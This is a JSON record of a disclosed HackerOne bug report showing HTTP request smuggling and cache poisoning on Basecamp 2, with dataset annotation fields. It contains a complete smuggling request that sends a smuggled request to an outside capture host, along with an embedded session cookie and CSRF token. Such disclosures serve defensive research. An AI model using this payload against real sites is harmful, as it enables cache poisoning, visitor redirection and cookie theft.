{
    "reported_to": "Basecamp",
    "reported_by": "hazimaslam ",
    "title": "HTTP request smuggling on Basecamp 2 allows web cache poisoning",
    "content": "\nIt is found that an authenticated Basecamp 2 user can desync front and backend servers and poison the socket with harmful response for the next visitor. During redirect probe, It also appears that front-end infrastructure performs caching of content. Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using X-Forwarded-Host request header in smuggled request. This will make the attack persistent, affecting any user who subsequently requests the affected URL.\nValidation steps\n1. Open https://requestbin.com/r/enjv2g5042bg in your browser for request capturing.\n2. Paste the following request in Burp repeater (I've embedded my session in the request for your ease):\nCode 898 Bytes\n1POST /4618984/account HTTP/1.1\n2Host: basecamp.com\n3Connection: keep-alive\n4Content-Length: 144\n5Accept: */*\n6X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=\n7User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\n8Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n9Cookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2UyBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMUJXNUtwM3IxaExPdVpJNis0R2tCVzVYVXBrdDU1Ymk5dElpcWdLRm8xWlk9BjsARkkiDnBlcnNvbl9pZAY7AEZpBHYSEQE%3D--ced0e607b9844aff72e0b9421e73e4d52c8b04bc;identity_id=BAhpBOwxQgE%3D--3a11dbd3096b61294dc6c864b807a87944e4b6ab;\n10Transfer-Encoding: chunked\n11Transfer-encoding: identity\n12\n1322\n14_method=patch&account%5Bname%5D=BC\n150\n16\n17GET /x HTTP/1.1\n18X-Forwarded-Host: enjv2g5042bg.x.pipedream.net\n19X-Forwarded-Proto: http\n20Foo: bar\nMake sure to set the target to https://basecamp.com and port to 443.\n3. Issue the request in repeater.\n4. Observe the captured request in RequestBin.com\nImpact\nWith request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.\nBy redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.\nIt is also possible to capture visitors' request headers and cookies.\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": 1700,
    "weaknesses": [
        "HTTP Request Smuggling"
    ],
    "screenshots": {},
    "disclosed_date": 1603911420,
    "report_url": "https://hackerone.com/reports/919175",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Open https://requestbin.com/r/enjv2g5042bg in your browser for request capturing."
        ],
        [
            2,
            "Paste the provided request in Burp repeater, ensuring the target is set to https://basecamp.com and port to 443."
        ],
        [
            3,
            "Issue the request in repeater."
        ],
        [
            4,
            "Observe the captured request in RequestBin.com."
        ]
    ],
    "vuln_description": "An authenticated Basecamp 2 user can desync front and backend servers, poisoning the socket with a harmful response for the next visitor. By leveraging HTTP request smuggling, the attacker can poison the cache with an off-site redirect response using the X-Forwarded-Host header, making the attack persistent and affecting subsequent visitors.",
    "reason": "The attack involves multiple components (HTTP request smuggling, cache poisoning, and redirect manipulation) and requires understanding subtle interactions between front-end and back-end servers. However, the techniques used (like chunked encoding and header manipulation) are well-documented in HTTP request smuggling attacks.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}